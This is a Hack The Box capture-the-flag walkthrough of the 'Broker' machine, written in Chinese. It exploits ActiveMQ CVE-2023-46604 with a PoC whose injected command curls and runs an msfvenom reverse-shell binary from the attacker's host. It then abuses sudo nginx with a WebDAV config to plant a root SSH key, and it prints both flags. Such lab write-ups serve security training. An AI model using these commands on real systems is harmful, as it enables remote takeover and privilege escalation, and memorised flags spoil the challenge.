###### tags: `Hack the box` `HTB` `Easy`

# Broker
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.147.172 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.147.172:22
Open 10.129.147.172:80
Open 10.129.147.172:1883
Open 10.129.147.172:5672
Open 10.129.147.172:8161
Open 10.129.147.172:41191
Open 10.129.147.172:61613
Open 10.129.147.172:61616
Open 10.129.147.172:61614

PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       syn-ack nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
1883/tcp  open  mqtt       syn-ack
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?      syn-ack
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       syn-ack Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Error 401 Unauthorized
41191/tcp open  tcpwrapped syn-ack
61613/tcp open  stomp      syn-ack Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       syn-ack Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
61616/tcp open  apachemq   syn-ack ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

前往80port可以用`admin/admin`登入可以看到`Apache ActiveMQ`，搜尋[CVE-2023-46604](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ)
```
修改poc-linux.xml
 <value>curl -s -o test.elf http://10.10.14.65/test.elf; chmod +x ./test.elf; ./test.elf</value>
 
┌──(kali㉿kali)-[~/htb/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.65 LPORT=1883 -f elf > test.elf

┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp1883

┌──(kali㉿kali)-[~/htb/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ]
└─$ go run main.go -i 10.129.230.87 -u http://10.10.14.65/poc-linux.xml
```

等反彈可到`/home/activemq`得user.txt
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

activemq@broker:/home/activemq$ cat user.txt
4ec599ebfee692ee5c845df2fccc6ad3
```

查看`sudo -l`
```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

製作一個`pwn.conf`寫入root ssh key
```
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
    worker_connections 768;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo /usr/sbin/nginx -h
sudo /usr/sbin/nginx -h
nginx version: nginx/1.18.0 (Ubuntu)
Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives]

Options:
  -?,-h         : this help
  -v            : show version and exit
  -V            : show version and configure options then exit
  -t            : test configuration and exit
  -T            : test configuration, dump it and exit
  -q            : suppress non-error messages during configuration testing
  -s signal     : send signal to a master process: stop, quit, reopen, reload
  -p prefix     : set prefix path (default: /usr/share/nginx/)
  -c filename   : set configuration file (default: /etc/nginx/nginx.conf)
  -g directives : set global directives out of configuration file

activemq@broker:/tmp$ wget 10.10.14.65/pwn.conf
activemq@broker:/tmp$ sudo nginx -c /tmp/pwn.conf
activemq@broker:/tmp$ ss -tlpn
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                         
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*                                   
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                   
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                   
LISTEN 0      511          0.0.0.0:1337       0.0.0.0:*                                   
LISTEN 0      4096               *:61613            *:*    users:(("java",pid=940,fd=145))
LISTEN 0      50                 *:61614            *:*    users:(("java",pid=940,fd=148))
LISTEN 0      4096               *:61616            *:*    users:(("java",pid=940,fd=143))
LISTEN 0      128             [::]:22            [::]:*                                   
LISTEN 0      4096               *:1883             *:*    users:(("java",pid=940,fd=146))
LISTEN 0      50                 *:8161             *:*    users:(("java",pid=940,fd=154))
LISTEN 0      4096               *:5672             *:*    users:(("java",pid=940,fd=144))
LISTEN 0      50                 *:43817            *:*    users:(("java",pid=940,fd=26))

activemq@broker:/tmp$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/activemq/.ssh/id_rsa): ./root
./root
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in ./root
Your public key has been saved in ./root.pub
The key fingerprint is:
SHA256:jsKe9ghyTzzereCcaA5Mr4FCOqll+4VeHqapMZJzpVY activemq@broker

activemq@broker:/tmp$ curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"
```

ssh root在/root得root.txt
```
activemq@broker:/tmp$ ssh -i root root@localhost
root@broker:~# cat root.txt
d2c99cf4b9277f9af62909fa261c07e9
```